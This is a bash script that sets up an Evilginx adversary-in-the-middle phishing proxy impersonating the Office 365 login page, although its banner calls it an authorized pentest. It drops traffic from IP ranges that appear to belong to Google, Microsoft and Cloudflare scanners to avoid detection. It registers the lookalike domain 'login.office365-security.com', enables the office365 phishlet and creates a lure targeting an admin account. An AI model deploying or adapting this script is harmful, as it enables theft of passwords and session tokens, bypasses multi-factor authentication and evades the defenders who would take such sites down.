#!/bin/bash
# master_evilginx_deploy.sh - Nginx + Evilginx + Deploy (SINGLE TERMINAL)

echo "🚀 Authorized Pentest Deploy - All-in-One"

# 1. Bot blocks
for IP in 66.249.64.0/18 20.41.0.0/16 104.16.0.0/12; do
    sudo iptables -A INPUT -s $IP -j DROP
done

# 2. START NGINX (background)
sudo nginx || sudo systemctl start nginx
echo "✅ Nginx: $(sudo systemctl status nginx | grep Active | awk '{print $2}')"

# 3. START EVILNGIX + DEPLOY (interactive)
cat << 'EOF' > deploy.evilginx
config domain login.office365-security.com
phishlets hostname login login.office365-security.com
phishlets enable office365
lures create office365 username="admin@target.com" --encrypted
lures get-url 0
phishlets list
EOF

echo "🔥 Starting Evilginx (Ctrl+C to exit after URL shows)..."
./build_run.bat < deploy.evilginx